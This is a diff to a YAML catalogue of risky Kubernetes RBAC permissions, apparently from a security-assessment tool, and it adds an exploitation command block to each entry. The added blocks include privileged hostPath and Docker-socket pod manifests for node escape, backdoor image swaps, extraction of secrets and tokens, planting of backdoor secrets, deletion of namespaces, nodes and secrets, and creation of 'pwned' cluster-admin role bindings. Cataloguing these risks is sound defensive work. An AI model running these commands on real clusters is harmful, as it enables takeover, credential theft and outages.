@@ -1,4 +1,3 @@
-# --- Core API Group (v1) ---
 - id: 1000
   name: "Cluster-wide pod exec"
   description: "Allows executing commands within any pod across the entire cluster. This provides direct shell access to running containers, enabling code execution, lateral movement, and potential privilege escalation by compromising sensitive workloads or accessing node resources."
@@ -15,6 +14,19 @@
       "LateralMovement",
       "ElevationOfPrivilege",
     ]
+  commands:
+    - description: "Execute a non-interactive command inside a specific pod."
+      command: |
+        kubectl exec <pod-name> -n <namespace> -- ls -la /
+        # Example: Execute 'whoami' in a coredns pod
+        # kubectl exec coredns-xxxx-yyyy -n kube-system -- whoami
+    - description: "Obtain an interactive shell inside a specific pod."
+      command: |
+        kubectl exec -it <pod-name> -n <namespace> -- sh
+        # If 'sh' is not available, try 'bash' or 'ash'
+        # kubectl exec -it <pod-name> -n <namespace> -- bash
+        # Example: Get a shell in a coredns pod
+        # kubectl exec -it coredns-xxxx-yyyy -n kube-system -- sh
 - id: 1001
   name: "Namespaced pod exec"
   description: "Permits executing commands within pods in a specific namespace. This grants shell access to containers within that namespace, potentially leading to code execution, lateral movement within the namespace, and privilege escalation if sensitive workloads or service accounts are compromised."
@@ -31,6 +43,15 @@
       "LateralMovement",
       "PotentialPrivilegeEscalation",
     ]
+  commands:
+    - description: "Execute a non-interactive command inside a specific pod within the namespace."
+      command: |
+        kubectl exec <pod-name> -n <namespace> -- cat /etc/passwd
+        # Example: kubectl exec my-app-pod-xyz -n default -- env
+    - description: "Obtain an interactive shell inside a specific pod within the namespace."
+      command: |
+        kubectl exec -it <pod-name> -n <namespace> -- sh
+        # Example: kubectl exec -it my-database-pod -n production -- bash
 - id: 1002
   name: "Cluster-wide pod attach"
   description: "Enables attaching to the input/output streams of any pod across the cluster. Similar to exec, this can grant interactive shell access, facilitating code execution, lateral movement, and privilege escalation by interacting with running processes."
@@ -47,6 +68,12 @@
       "LateralMovement",
       "ElevationOfPrivilege",
     ]
+  commands:
+    - description: "Attach to a running container's process to view its output or send input."
+      command: |
+        kubectl attach -it <pod-name> -n <namespace> -c <container-name>
+        # Example: Attach to the main container of a web server pod
+        # kubectl attach -it my-web-server-pod -n default -c web-container
 - id: 1003
   name: "Namespaced pod attach"
   description: "Allows attaching to the input/output streams of pods within a specific namespace. This can provide interactive access to containers in that namespace, risking code execution, lateral movement, and potential privilege escalation through compromised workloads."
@@ -63,6 +90,12 @@
       "LateralMovement",
       "PotentialPrivilegeEscalation",
     ]
+  commands:
+    - description: "Attach to a running container's process within the namespace."
+      command: |
+        kubectl attach -it <pod-name> -n <namespace> -c <container-name>
+        # Example: Attach to a logging agent pod in the 'monitoring' namespace
+        # kubectl attach -it fluentd-xyz -n monitoring -c fluentd
 - id: 1004
   name: "Cluster-wide pod port-forward"
   description: "Grants the ability to forward local ports to ports on any pod across the cluster. This can expose internal services, facilitate lateral movement by bypassing network policies, and lead to information disclosure from otherwise inaccessible applications."
@@ -73,6 +106,13 @@
   resources: ["pods/portforward"]
   verbs: ["create"]
   tags: ["ClusterWidePodPortForward", "LateralMovement", "NetworkManipulation"]
+  commands:
+    - description: "Forward a local port to a port on a specific pod."
+      command: |
+        kubectl port-forward <pod-name> -n <namespace> <local-port>:<pod-port>
+        # Example: Forward local port 8080 to port 80 of a database pod
+        # kubectl port-forward my-db-pod-abc -n production 8080:5432
+        # Then access via: curl http://localhost:8080
 - id: 1005
   name: "Namespaced pod port-forward"
   description: "Permits forwarding local ports to ports on pods within a specific namespace. This can expose internal services within that namespace, enable lateral movement, and potentially lead to information disclosure from applications not intended for external access."
@@ -83,6 +123,12 @@
   resources: ["pods/portforward"]
   verbs: ["create"]
   tags: ["PodPortForward", "LateralMovement", "NetworkManipulation"]
+  commands:
+    - description: "Forward a local port to a port on a specific pod within the namespace."
+      command: |
+        kubectl port-forward <pod-name> -n <namespace> <local-port>:<pod-port>
+        # Example: Forward local port 3000 to port 3000 of a frontend pod
+        # kubectl port-forward my-frontend-pod -n default 3000:3000
 - id: 1006
   name: "Create pods cluster-wide"
   description: "Allows creating new pods in any namespace across the cluster. This is highly critical as it can be used to deploy pods with elevated privileges (e.g., hostPath mounts, privileged security context), leading to node compromise, cluster-wide code execution, and establishing persistence."
@@ -99,6 +145,53 @@
       "LateralMovement",
       "Persistence",
     ]
+  commands:
+    - description: "Create a privileged pod with hostPath access to the node's root filesystem."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: privileged-attacker-pod
+        spec:
+          hostNetwork: true
+          hostPID: true
+          hostIPC: true
+          containers:
+          - name: attacker
+            image: busybox
+            command: ["/bin/sh", "-c", "sleep infinity"]
+            securityContext:
+              privileged: true
+            volumeMounts:
+            - mountPath: /host
+              name: host-root
+          volumes:
+          - name: host-root
+            hostPath:
+              path: /
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Create a pod that mounts the host's Docker socket for container escape."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: docker-socket-pod
+        spec:
+          containers:
+          - name: docker-client
+            image: docker
+            command: ["/bin/sh", "-c", "sleep infinity"]
+            volumeMounts:
+            - mountPath: /var/run/docker.sock
+              name: docker-socket
+          volumes:
+          - name: docker-socket
+            hostPath:
+              path: /var/run/docker.sock
+        EOF
 - id: 1007
   name: "Create pods in a namespace"
   description: "Grants permission to create new pods within a specific namespace. This can lead to privilege escalation if allowed to create pods with hostPath mounts, privileged security context, or access to sensitive service accounts within that namespace. It also enables workload execution and potential persistence."
@@ -115,6 +208,43 @@
       "LateralMovement",
       "Persistence",
     ]
+  commands:
+    - description: "Create a pod with a hostPath mount to access node files within the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: hostpath-pod
+        spec:
+          containers:
+          - name: hostpath-container
+            image: busybox
+            command: ["/bin/sh", "-c", "sleep infinity"]
+            volumeMounts:
+            - mountPath: /host-etc
+              name: host-etc
+          volumes:
+          - name: host-etc
+            hostPath:
+              path: /etc
+        EOF
+        # Example: kubectl create -n development -f - <<EOF ... EOF
+    - description: "Create a pod that uses a specific service account in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: sa-test-pod
+        spec:
+          serviceAccountName: <serviceaccount-name>
+          containers:
+          - name: test-container
+            image: busybox
+            command: ["/bin/sh", "-c", "sleep infinity"]
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF (using 'default' SA)
 - id: 1008
   name: "Update/Patch pods cluster-wide"
   description: "Permits modifying existing pods in any namespace across the cluster. This is critical as an attacker can alter a pod's specification to grant it elevated privileges (e.g., change image, add privileged security context, mount sensitive host paths), leading to code execution, privilege escalation, and tampering with running workloads."
@@ -125,6 +255,15 @@
   resources: ["pods"]
   verbs: ["update", "patch"]
   tags: ["WorkloadExecution", "PrivilegeEscalation", "Tampering"]
+  commands:
+    - description: "Patch a running pod to change its container image to a malicious one."
+      command: |
+        kubectl set image pod/<pod-name> <container-name>=<malicious-image> -n <namespace>
+        # Example: kubectl set image pod/nginx-deployment-xyz nginx=malicious/nginx-backdoor -n default
+    - description: "Patch a running pod to add a privileged security context (if not blocked by PSP/PSA)."
+      command: |
+        kubectl patch pod <pod-name> -n <namespace> --type='json' -p='[{"op": "add", "path": "/spec/containers/0/securityContext", "value": {"privileged": true}}]'
+        # Example: kubectl patch pod my-app-pod -n production --type='json' -p='[{"op": "add", "path": "/spec/containers/0/securityContext", "value": {"privileged": true}}]'
 - id: 1009
   name: "Update/Patch pods in a namespace"
   description: "Allows modifying existing pods within a specific namespace. This can be used to escalate privileges by changing a pod's configuration to run with higher permissions, execute arbitrary code, or tamper with application behavior within that namespace."
@@ -135,6 +274,15 @@
   resources: ["pods"]
   verbs: ["update", "patch"]
   tags: ["WorkloadExecution", "PotentialPrivilegeEscalation", "Tampering"]
+  commands:
+    - description: "Patch a running pod in the namespace to change its container image."
+      command: |
+        kubectl set image pod/<pod-name> <container-name>=<malicious-image> -n <namespace>
+        # Example: kubectl set image pod/my-web-app web=attacker/web-shell -n dev
+    - description: "Patch a running pod to add a hostPath volume mount (if not blocked by PSP/PSA)."
+      command: |
+        kubectl patch pod <pod-name> -n <namespace> --type='json' -p='[{"op": "add", "path": "/spec/volumes/-", "value": {"name": "host-path-vol", "hostPath": {"path": "/etc"}}}, {"op": "add", "path": "/spec/containers/0/volumeMounts/-", "value": {"name": "host-path-vol", "mountPath": "/mnt/host-etc"}}]'
+        # Example: kubectl patch pod my-app -n default --type='json' -p='[{"op": "add", "path": "/spec/volumes/-", "value": {"name": "host-path-vol", "hostPath": {"path": "/etc"}}}, {"op": "add", "path": "/spec/containers/0/volumeMounts/-", "value": {"name": "host-path-vol", "mountPath": "/mnt/host-etc"}}]'
 - id: 1010
   name: "Read secrets cluster-wide"
   description: "Grants access to read all secrets across all namespaces in the cluster. This is extremely critical as secrets often contain sensitive credentials, API keys, tokens, and other confidential data, leading to widespread data exposure and potential full cluster compromise."
@@ -151,6 +299,15 @@
       "DataExposure",
       "InformationDisclosure",
     ]
+  commands:
+    - description: "List all secrets across all namespaces."
+      command: |
+        kubectl get secrets --all-namespaces
+    - description: "Retrieve and decode a specific secret's data."
+      command: |
+        kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.<key>}' | base64 -d
+        # Example: Get the default service account token
+        # kubectl get secret $(kubectl get sa default -n kube-system -o jsonpath='{.secrets[0].name}') -n kube-system -o jsonpath='{.data.token}' | base64 -d
 - id: 1011
   name: "Read secrets in a namespace"
   description: "Permits reading all secrets within a specific namespace. Even though namespaced, this is critical as secrets store sensitive information like database credentials, API keys, and service account tokens, which can lead to data exposure and privilege escalation within or beyond the namespace."
@@ -167,6 +324,15 @@
       "DataExposure",
       "InformationDisclosure",
     ]
+  commands:
+    - description: "List all secrets in a specific namespace."
+      command: |
+        kubectl get secrets -n <namespace>
+        # Example: kubectl get secrets -n production
+    - description: "Retrieve and decode a specific secret's data within the namespace."
+      command: |
+        kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.<key>}' | base64 -d
+        # Example: kubectl get secret my-db-credentials -n production -o jsonpath='{.data.password}' | base64 -d
 - id: 1012
   name: "Modify secrets cluster-wide"
   description: "Allows creating, updating, patching, or deleting secrets in any namespace across the cluster. This is highly critical as it enables an attacker to inject malicious credentials, tamper with existing secrets, or delete critical ones, leading to privilege escalation, persistence, and service disruption."
@@ -183,6 +349,22 @@
       "PrivilegeEscalation",
       "Persistence",
     ]
+  commands:
+    - description: "Create a new secret with arbitrary data in any namespace."
+      command: |
+        kubectl create secret generic <new-secret-name> --from-literal=malicious_key=malicious_value -n <namespace>
+        # Example: kubectl create secret generic backdoor-creds --from-literal=user=admin --from-literal=pass=pwned -n kube-system
+    - description: "Patch an existing secret to change its data (e.g., inject malicious credentials)."
+      command: |
+        # First, get the current secret data, base64 encode your new value, then patch.
+        # Example: Change a database password in a secret
+        # NEW_PASS_B64=$(echo -n "new_malicious_password" | base64)
+        # kubectl patch secret <secret-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/password", "value": "'"$NEW_PASS_B64"'"}]'
+        kubectl patch secret <secret-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/<key>", "value": "<base64-encoded-new-value>"}]'
+    - description: "Delete a critical secret, causing application disruption."
+      command: |
+        kubectl delete secret <secret-name> -n <namespace>
+        # Example: kubectl delete secret kubernetes-dashboard-token-xyz -n kubernetes-dashboard
 - id: 1013
   name: "Modify secrets in a namespace"
   description: "Grants permission to create, update, patch, or delete secrets within a specific namespace. This allows an attacker to tamper with sensitive credentials, potentially escalate privileges by modifying service account tokens or application secrets, and establish persistence within that namespace."
@@ -194,6 +376,20 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["SecretAccess", "Tampering", "PotentialPrivilegeEscalation", "Persistence"]
+  commands:
+    - description: "Create a new secret with arbitrary data in the namespace."
+      command: |
+        kubectl create secret generic <new-secret-name> --from-literal=malicious_key=malicious_value -n <namespace>
+        # Example: kubectl create secret generic my-app-backdoor-token --from-literal=token=eviltoken -n default
+    - description: "Patch an existing secret to change its data within the namespace."
+      command: |
+        # NEW_VALUE_B64=$(echo -n "new_value" | base64)
+        # kubectl patch secret <secret-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/<key>", "value": "'"$NEW_VALUE_B64"'"}]'
+        kubectl patch secret <secret-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/<key>", "value": "<base64-encoded-new-value>"}]'
+    - description: "Delete a critical secret within the namespace, causing disruption."
+      command: |
+        kubectl delete secret <secret-name> -n <namespace>
+        # Example: kubectl delete secret my-app-db-password -n production
 - id: 1014
   name: "Node proxy access (Kubelet API)"
   description: "Provides direct access to the Kubelet API on any node in the cluster. This is equivalent to cluster admin access, allowing an attacker to run commands on nodes, access pod logs, execute commands in containers, and retrieve sensitive information directly from the nodes, leading to full cluster compromise."
@@ -212,6 +408,22 @@
       "DataExposure",
       "Tampering",
     ]
+  commands:
+    - description: "Access Kubelet healthz endpoint on a node via proxy."
+      command: |
+        kubectl proxy &
+        curl -s http://localhost:8001/api/v1/nodes/<node-name>/proxy/healthz
+        # Example: curl -s http://localhost:8001/api/v1/nodes/minikube/proxy/healthz
+    - description: "List all pods running on a specific node via Kubelet API."
+      command: |
+        kubectl proxy &
+        curl -s http://localhost:8001/api/v1/nodes/<node-name>/proxy/pods/
+        # Example: curl -s http://localhost:8001/api/v1/nodes/minikube/proxy/pods/
+    - description: "Retrieve logs from a specific container on a node via Kubelet API."
+      command: |
+        kubectl proxy &
+        curl -s http://localhost:8001/api/v1/nodes/<node-name>/proxy/containerLogs/<namespace>/<pod-name>/<container-name>
+        # Example: curl -s http://localhost:8001/api/v1/nodes/minikube/proxy/containerLogs/kube-system/coredns-xxxx-yyyy/coredns
 - id: 1015
   name: "Modify node configuration (labels, taints)"
   description: "Allows modifying node configurations, such as labels and taints, across the cluster. This can be abused to influence pod scheduling, potentially forcing sensitive workloads onto compromised nodes or causing denial of service by misconfiguring taints. It can also be a step towards privilege escalation."
@@ -228,6 +440,15 @@
       "PotentialPrivilegeEscalation",
       "DenialOfService",
     ]
+  commands:
+    - description: "Add a label to a node to influence scheduling or identify for attack."
+      command: |
+        kubectl label node <node-name> <label-key>=<label-value>
+        # Example: kubectl label node minikube compromised=true
+    - description: "Add a taint to a node to prevent new pods from being scheduled on it (DoS)."
+      command: |
+        kubectl taint node <node-name> <taint-key>=<taint-value>:<effect>
+        # Example: kubectl taint node minikube NoSchedule=true:NoSchedule
 - id: 1016
   name: "Delete nodes"
   description: "Grants permission to delete nodes from the cluster. This can lead to a severe denial of service by removing compute capacity, disrupting running applications, and potentially causing data loss for workloads not designed for sudden node disappearance."
@@ -238,6 +459,11 @@
   resources: ["nodes"]
   verbs: ["delete", "deletecollection"]
   tags: ["NodeAccess", "DenialOfService", "ResourceDeletion"]
+  commands:
+    - description: "Delete a specific node from the cluster."
+      command: |
+        kubectl delete node <node-name>
+        # Example: kubectl delete node minikube
 - id: 1017
   name: "Manage PersistentVolumes (cluster-wide storage manipulation)"
   description: "Permits creating, updating, patching, or deleting PersistentVolumes across the cluster. This allows manipulation of cluster-wide storage, potentially leading to data exposure by accessing sensitive data, data loss by deleting volumes, tampering with stored information, or denial of service."
@@ -255,6 +481,27 @@
       "DenialOfService",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new PersistentVolume with hostPath to access node filesystem."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: v1
+        kind: PersistentVolume
+        metadata:
+          name: hostpath-pv
+        spec:
+          capacity:
+            storage: 1Gi
+          accessModes:
+            - ReadWriteOnce
+          hostPath:
+            path: /
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing PersistentVolume, potentially causing data loss."
+      command: |
+        kubectl delete pv <persistentvolume-name>
+        # Example: kubectl delete pv my-app-pv
 - id: 1018
   name: "Read pod logs cluster-wide"
   description: "Allows accessing logs from any pod across all namespaces in the cluster. This can lead to information disclosure if logs contain sensitive data, credentials, or operational details that could be exploited."
@@ -265,6 +512,15 @@
   resources: ["pods/log"]
   verbs: ["get"]
   tags: ["ClusterWideLogAccess", "InformationDisclosure", "DataExposure"]
+  commands:
+    - description: "Retrieve logs from a specific pod in any namespace."
+      command: |
+        kubectl logs <pod-name> -n <namespace>
+        # Example: kubectl logs coredns-xxxx-yyyy -n kube-system
+    - description: "Retrieve logs from all containers in a multi-container pod."
+      command: |
+        kubectl logs <pod-name> -n <namespace> --all-containers
+        # Example: kubectl logs my-app-pod -n default --all-containers
 - id: 1019
   name: "Read pod logs in a namespace"
   description: "Grants permission to read logs from pods within a specific namespace. This can expose sensitive application data, credentials, or operational details if present in the logs, leading to information disclosure."
@@ -275,6 +531,15 @@
   resources: ["pods/log"]
   verbs: ["get"]
   tags: ["LogAccess", "InformationDisclosure", "DataExposure"]
+  commands:
+    - description: "Retrieve logs from a specific pod within the namespace."
+      command: |
+        kubectl logs <pod-name> -n <namespace>
+        # Example: kubectl logs my-web-app-pod -n production
+    - description: "Retrieve logs from a specific container in a pod within the namespace."
+      command: |
+        kubectl logs <pod-name> -n <namespace> -c <container-name>
+        # Example: kubectl logs my-app-pod -n default -c init-db
 - id: 1020
   name: "Manage ephemeral containers cluster-wide"
   description: "Permits adding or modifying ephemeral containers in any pod across the cluster. This is highly risky as it allows injecting arbitrary code into running pods, facilitating code execution, lateral movement, tampering with live applications, and privilege escalation."
@@ -292,6 +557,11 @@
       "Tampering",
       "ElevationOfPrivilege",
     ]
+  commands:
+    - description: "Add an ephemeral debug container to a running pod to gain shell access."
+      command: |
+        kubectl debug -it <pod-name> -n <namespace> --image=busybox --target=<container-name> -- sh
+        # Example: kubectl debug -it my-app-pod -n default --image=nicolaka/netshoot --target=my-app-container -- sh
 - id: 1021
   name: "Manage ephemeral containers in a namespace"
   description: "Allows adding or modifying ephemeral containers in pods within a specific namespace. This enables injecting code into running pods in that namespace, potentially leading to code execution, lateral movement, tampering, and privilege escalation if sensitive pods are targeted."
@@ -309,6 +579,11 @@
       "Tampering",
       "PotentialPrivilegeEscalation",
     ]
+  commands:
+    - description: "Add an ephemeral debug container to a running pod within the namespace."
+      command: |
+        kubectl debug -it <pod-name> -n <namespace> --image=busybox --target=<container-name> -- sh
+        # Example: kubectl debug -it my-db-pod -n production --image=alpine/git --target=db-container -- bash
 - id: 1022
   name: "Read ConfigMaps cluster-wide"
   description: "Grants access to read all ConfigMaps across all namespaces. ConfigMaps can store non-sensitive configuration data but may sometimes inadvertently contain sensitive information, API endpoints, or settings that could be exploited, leading to information disclosure."
@@ -319,6 +594,14 @@
   resources: ["configmaps"]
   verbs: ["get", "list", "watch"]
   tags: ["InformationDisclosure", "ConfigMapAccess", "DataExposure"]
+  commands:
+    - description: "List all ConfigMaps across all namespaces."
+      command: |
+        kubectl get configmaps --all-namespaces
+    - description: "Retrieve a specific ConfigMap's data."
+      command: |
+        kubectl get configmap <configmap-name> -n <namespace> -o yaml
+        # Example: kubectl get configmap kube-proxy -n kube-system -o yaml
 - id: 1023
   name: "Read ConfigMaps in a namespace"
   description: "Permits reading ConfigMaps within a specific namespace. This can lead to information disclosure if ConfigMaps store sensitive configuration details, connection strings, or other exploitable data for applications within that namespace."
@@ -329,6 +612,15 @@
   resources: ["configmaps"]
   verbs: ["get", "list", "watch"]
   tags: ["InformationDisclosure", "ConfigMapAccess", "DataExposure"]
+  commands:
+    - description: "List all ConfigMaps in a specific namespace."
+      command: |
+        kubectl get configmaps -n <namespace>
+        # Example: kubectl get configmaps my-app-config -n default
+    - description: "Retrieve a specific ConfigMap's data within the namespace."
+      command: |
+        kubectl get configmap <configmap-name> -n <namespace> -o yaml
+        # Example: kubectl get configmap my-app-settings -n production -o yaml
 - id: 1024
   name: "Modify ConfigMaps cluster-wide"
   description: "Allows creating, updating, patching, or deleting ConfigMaps in any namespace. This enables an attacker to tamper with application configurations across the cluster, potentially leading to misconfigurations, denial of service, or privilege escalation if applications consume malicious configurations."
@@ -339,6 +631,19 @@
   resources: ["configmaps"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["Tampering", "ConfigMapAccess", "PotentialPrivilegeEscalation"]
+  commands:
+    - description: "Create a new ConfigMap with malicious configuration in any namespace."
+      command: |
+        kubectl create configmap <new-cm-name> --from-literal=malicious_setting=true -n <namespace>
+        # Example: kubectl create configmap backdoor-config --from-literal=debug_mode=true -n kube-system
+    - description: "Patch an existing ConfigMap to alter application behavior."
+      command: |
+        kubectl patch configmap <configmap-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/<key>", "value": "<new-value>"}]'
+        # Example: kubectl patch configmap my-app-config -n default --type='json' -p='[{"op": "replace", "path": "/data/log_level", "value": "DEBUG"}]'
+    - description: "Delete a critical ConfigMap, causing application disruption."
+      command: |
+        kubectl delete configmap <configmap-name> -n <namespace>
+        # Example: kubectl delete configmap coredns -n kube-system
 - id: 1025
   name: "Modify ConfigMaps in a namespace"
   description: "Grants permission to create, update, patch, or delete ConfigMaps within a specific namespace. This allows an attacker to tamper with application configurations, potentially causing service disruption or enabling further exploitation if applications load malicious settings."
@@ -349,6 +654,19 @@
   resources: ["configmaps"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["Tampering", "ConfigMapAccess", "PotentialPrivilegeEscalation"]
+  commands:
+    - description: "Create a new ConfigMap with malicious configuration in the namespace."
+      command: |
+        kubectl create configmap <new-cm-name> --from-literal=malicious_setting=true -n <namespace>
+        # Example: kubectl create configmap dev-backdoor-config --from-literal=enable_shell=true -n development
+    - description: "Patch an existing ConfigMap to alter application behavior within the namespace."
+      command: |
+        kubectl patch configmap <configmap-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/data/<key>", "value": "<new-value>"}]'
+        # Example: kubectl patch configmap my-app-config -n production --type='json' -p='[{"op": "replace", "path": "/data/db_host", "value": "malicious-db.example.com"}]'
+    - description: "Delete a critical ConfigMap within the namespace, causing disruption."
+      command: |
+        kubectl delete configmap <configmap-name> -n <namespace>
+        # Example: kubectl delete configmap my-app-env -n default
 - id: 1026
   name: "Delete namespaces"
   description: "Permits deleting entire namespaces from the cluster. This is a destructive action that can lead to a significant denial of service by removing all resources, applications, and configurations within the targeted namespaces."
@@ -359,8 +677,11 @@
   resources: ["namespaces"]
   verbs: ["delete"]
   tags: ["NamespaceLifecycle", "ResourceDeletion", "DenialOfService"]
-
-# --- RBAC API Group (rbac.authorization.k8s.io/v1) ---
+  commands:
+    - description: "Delete a specific namespace and all its resources."
+      command: |
+        kubectl delete namespace <namespace-name>
+        # Example: kubectl delete namespace production
 - id: 1027
   name: "Manage ClusterRoles (create, update, patch, delete)"
   description: "Allows creating, modifying, or deleting ClusterRoles. This grants the ability to define or alter cluster-wide permissions, enabling an attacker to grant themselves or others arbitrary privileges, including full cluster admin access, leading to complete cluster compromise."
@@ -371,6 +692,24 @@
   resources: ["clusterroles"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["RBACManipulation", "ClusterAdminAccess", "PrivilegeEscalation"]
+  commands:
+    - description: "Create a new ClusterRole with cluster-admin privileges."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: ClusterRole
+        metadata:
+          name: pwned-cluster-admin
+        rules:
+        - apiGroups: ["*"]
+          resources: ["*"]
+          verbs: ["*"]
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete a critical ClusterRole, potentially breaking cluster functionality."
+      command: |
+        kubectl delete clusterrole <clusterrole-name>
+        # Example: kubectl delete clusterrole system:controller-manager
 - id: 1028
   name: "Manage ClusterRoleBindings (create, update, patch, delete)"
   description: "Permits creating, modifying, or deleting ClusterRoleBindings. This allows an attacker to bind any user, group, or service account to any ClusterRole (including highly privileged ones like cluster-admin), effectively granting arbitrary cluster-wide permissions and leading to privilege escalation."
@@ -387,6 +726,28 @@
       "PrivilegeEscalation",
       "BindingToPrivilegedRole",
     ]
+  commands:
+    - description: "Create a ClusterRoleBinding to grant cluster-admin to a service account."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: ClusterRoleBinding
+        metadata:
+          name: pwned-cluster-admin-binding
+        subjects:
+        - kind: ServiceAccount
+          name: <serviceaccount-name>
+          namespace: <namespace>
+        roleRef:
+          kind: ClusterRole
+          name: cluster-admin
+          apiGroup: rbac.authorization.k8s.io
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF (bind 'default' SA in 'default' namespace to cluster-admin)
+    - description: "Delete a ClusterRoleBinding, revoking cluster-wide permissions."
+      command: |
+        kubectl delete clusterrolebinding <clusterrolebinding-name>
+        # Example: kubectl delete clusterrolebinding system:kube-controller-manager
 - id: 1029
   name: "Manage Roles in a namespace (create, update, patch, delete)"
   description: "Grants permission to create, modify, or delete Roles within a specific namespace. This allows an attacker to define or alter namespaced permissions, potentially granting themselves elevated access to resources within that namespace."
@@ -397,6 +758,24 @@
   resources: ["roles"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["RBACManipulation", "PrivilegeEscalation"]
+  commands:
+    - description: "Create a new Role with full permissions within the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: Role
+        metadata:
+          name: pwned-namespace-admin
+        rules:
+        - apiGroups: ["*"]
+          resources: ["*"]
+          verbs: ["*"]
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Delete an existing Role, potentially disrupting application permissions."
+      command: |
+        kubectl delete role <role-name> -n <namespace>
+        # Example: kubectl delete role pod-reader -n default
 - id: 1030
   name: "Manage RoleBindings in a namespace (create, update, patch, delete)"
   description: "Allows creating, modifying, or deleting RoleBindings within a specific namespace. This enables an attacker to bind users, groups, or service accounts to Roles within that namespace. If a powerful ClusterRole is bound to a service account in the namespace, this can lead to privilege escalation."
@@ -407,6 +786,28 @@
   resources: ["rolebindings"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["RBACManipulation", "PrivilegeEscalation", "BindingToPrivilegedRole"]
+  commands:
+    - description: "Create a RoleBinding to grant a service account full namespace admin."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: RoleBinding
+        metadata:
+          name: pwned-namespace-admin-binding
+        subjects:
+        - kind: ServiceAccount
+          name: <serviceaccount-name>
+          namespace: <namespace>
+        roleRef:
+          kind: Role
+          name: pwned-namespace-admin # Assuming 'pwned-namespace-admin' role exists
+          apiGroup: rbac.authorization.k8s.io
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF (bind 'default' SA to 'pwned-namespace-admin' role)
+    - description: "Delete an existing RoleBinding, revoking namespaced permissions."
+      command: |
+        kubectl delete rolebinding <rolebinding-name> -n <namespace>
+        # Example: kubectl delete rolebinding my-app-reader-binding -n production
 - id: 1031
   name: "Escalate privileges via ClusterRoles (escalate verb)"
   description: "Permits using the 'escalate' verb on ClusterRoles (or Roles). This allows a user to create or update a role with more permissions than they currently possess, up to the permissions defined in the role they are escalating, leading to direct privilege escalation."
@@ -417,6 +818,22 @@
   resources: ["clusterroles"] # Could also be on "roles"
   verbs: ["escalate"]
   tags: ["RBACManipulation", "ClusterAdminAccess", "PrivilegeEscalation"]
+  commands:
+    - description: "Create a new ClusterRole with elevated permissions (e.g., 'create pods') that the current user doesn't directly have, leveraging the 'escalate' permission."
+      command: |
+        # This command will succeed if the user has 'escalate' on 'clusterroles',
+        # even if they don't have 'create pods' directly.
+        kubectl create -f - <<EOF
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: ClusterRole
+        metadata:
+          name: elevated-pod-creator
+        rules:
+        - apiGroups: [""]
+          resources: ["pods"]
+          verbs: ["create"]
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
 - id: 1032
   name: "Bind ClusterRoles to identities (bind verb)"
   description: "Permits using the 'bind' verb on ClusterRoles (or Roles). This allows a user to create a ClusterRoleBinding (or RoleBinding) that grants the permissions of a specific role to another user, group, or service account, potentially leading to privilege escalation if a highly privileged role is bound."
@@ -433,8 +850,25 @@
       "PrivilegeEscalation",
       "BindingToPrivilegedRole",
     ]
-
-# --- Workload Controllers (apps/v1, batch/v1) ---
+  commands:
+    - description: "Create a ClusterRoleBinding to grant 'cluster-admin' to a service account, leveraging the 'bind' permission on the 'cluster-admin' ClusterRole."
+      command: |
+        # This command will succeed if the user has 'bind' on the 'cluster-admin' ClusterRole.
+        kubectl create -f - <<EOF
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: ClusterRoleBinding
+        metadata:
+          name: bind-to-cluster-admin
+        subjects:
+        - kind: ServiceAccount
+          name: <serviceaccount-name>
+          namespace: <namespace>
+        roleRef:
+          kind: ClusterRole
+          name: cluster-admin
+          apiGroup: rbac.authorization.k8s.io
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF (bind 'default' SA in 'default' namespace to cluster-admin)
 - id: 1033
   name: "Manage Deployments cluster-wide (potential for privileged pod execution)"
   description: "Allows creating, updating, or deleting Deployments across all namespaces. Deployments manage pod replicas, and this permission can be used to deploy pods with privileged settings, leading to code execution, privilege escalation, persistence, and tampering with cluster workloads."
@@ -445,6 +879,45 @@
   resources: ["deployments"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["WorkloadLifecycle", "PrivilegeEscalation", "Persistence", "Tampering"]
+  commands:
+    - description: "Create a new Deployment with a privileged pod template."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
